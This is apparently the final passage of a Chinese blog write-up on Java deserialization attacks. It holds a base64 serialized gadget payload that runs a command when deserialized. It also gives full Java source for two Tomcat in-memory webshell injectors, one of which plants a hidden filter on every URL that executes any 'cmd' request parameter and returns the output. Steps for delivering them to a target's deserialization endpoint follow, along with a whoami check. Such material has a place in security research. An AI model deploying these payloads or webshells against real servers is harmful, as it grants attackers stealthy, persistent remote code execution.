AGX2NsYXNzcQB+ABNMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAGosr+ur4AAAA0ADoKAAkAKQoAKgArCAAsCgAqAC0HAC4HAC8KAAYAMAcAMQcAMgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAXTG9yZy9leGFtcGxlL2V2aWxjbGFzczsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHADMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQAEdmFyMQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAC4BAApTb3VyY2VGaWxlAQAOZXZpbGNsYXNzLmphdmEMAAoACwcANAwANQA2AQAEY2FsYwwANwA4AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKADkBABVvcmcvZXhhbXBsZS9ldmlsY2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABQABAAoACwABAAwAAAAzAAEAAQAAAAUqtwABsQAAAAIADQAAAAoAAgAAABAABAARAA4AAAAMAAEAAAAFAA8AEAAAAAkAEQASAAEADAAAACsAAAABAAAAAbEAAAACAA0AAAAGAAEAAAAUAA4AAAAMAAEAAAABABMAFAAAAAEAFQAWAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAXAA4AAAAgAAMAAAABAA8AEAAAAAAAAQAXABgAAQAAAAEAGQAaAAIAGwAAAAQAAQAcAAEAFQAdAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAaAA4AAAAqAAQAAAABAA8AEAAAAAAAAQAXABgAAQAAAAEAHgAfAAIAAAABACAAIQADABsAAAAEAAEAHAAIACIACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAAHgAJACEADAAfAA0AIAAWACIADgAAAAwAAQANAAkAIwAkAAAAJQAAAAcAAkwHACYJAAEAJwAAAAIAKHB0AANhYWFwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAXQABXZhbHVlcQB+ACd4eHZyABtqYXZhLmxhbmcuYW5ub3RhdGlvbi5UYXJnZXQAAAAAAAAAAAAAAHhw
```
传参的时候url编码一下，就会弹计算器。
## 反序列化注入内存马
request获取
```java
package com.example.Echo_shell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class Tmocat_Echo_inject_ThreadLocal extends AbstractTranslet {

    static {
        try{

            //反射获取属性
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");

            //修改finnal
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            //修改值为true
            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)) {
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
            }

            if (lastServicedRequestField.get(null) == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());
            }

            if (lastServicedResponseField.get(null) == null) {
                lastServicedResponseField.set(null, new ThreadLocal<>());
            }

            //response的获取
            if(lastServicedResponseField.get(null)!=null){
                ThreadLocal threadLocal = (ThreadLocal) lastServicedResponseField.get(null);
                ServletResponse  servletResponse = (ServletResponse) threadLocal.get();

                PrintWriter writer = servletResponse.getWriter();
                writer.write("Inject ThreanLocal success!");
                writer.flush();
                writer.close();
            }

        }catch(Exception e){e.printStackTrace();}
    }



    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

注入filter
```java
package com.example.Echo_shell;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterChain;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;

public class Tomcat_Echo_inject_Filter extends AbstractTranslet implements Filter {

    static {
        try {
            ServletContext servletContext = getServletContext();
            java.lang.reflect.Field appContextField = servletContext.getClass().getDeclaredField("context");
            appContextField.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
            java.lang.reflect.Field standardContextField = applicationContext.getClass().getDeclaredField("context");
            standardContextField.setAccessible(true);
            StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);


            Tomcat_Echo_inject_Filter filter = new Tomcat_Echo_inject_Filter();
            String name = "ShellFilter";
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName(name);
            filterDef.setFilterClass(filter.getClass().getName());
            standardContext.addFilterDef(filterDef);


            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/*");
            filterMap.setFilterName(name);
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMapBefore(filterMap);


            java.lang.reflect.Field Configs = StandardContext.class.getDeclaredField("filterConfigs");//filterConfigs
            Configs.setAccessible(true);
            java.util.Map filterConfigs = (java.util.Map) Configs.get(standardContext);

            java.lang.reflect.Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
            filterConfigs.put(name, filterConfig);

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
    }


    public static ServletContext getServletContext() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        java.lang.reflect.Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
        lastServicedRequestField.setAccessible(true);
        ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null);
        if(threadLocal!=null && threadLocal.get()!=null){
            ServletRequest servletRequest = (ServletRequest) threadLocal.get();
            return servletRequest.getServletContext();
        }
        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        response.setContentType("text/html; charset=UTF-8");
        PrintWriter writer = response.getWriter();
        if (cmd != null) {
            try {
                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();

                //将命令执行结果写入扫描器并读取所有输入
                java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter("\\A");
                String result = scanner.hasNext()?scanner.next():"";
                scanner.close();
                writer.write(result);
                writer.flush();
                writer.close();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NullPointerException n) {
                n.printStackTrace();
            }
        }
        chain.doFilter(request, response);
    }
}

```
将类编译，放入cc链payload构造的恶意类获取，生成序列化文件，转b64，打入目标反序列化入口。
第一次打request获取，第二次打filter注入。访问/?cmd=whoami有回显。
feng佬的exp有点问题，打的时候没打通，我稍微修改了一下打通了。
![微信截图_20230623201203.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1687522340431-ea1fad40-f9fd-4e01-a5df-88e4f95739cf.png#averageHue=%23edebe9&clientId=u3a2ead6f-512a-4&from=paste&height=354&id=uf3c2a858&originHeight=442&originWidth=1808&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=68724&status=done&style=none&taskId=ub39b4835-7d30-48d7-84af-5da77db4e92&title=&width=1446.4)


# 最後
呜呼，终于完结了这个系列，整了一个多星期才搞完，内容太多了，还不熟，还得慢慢磨。。
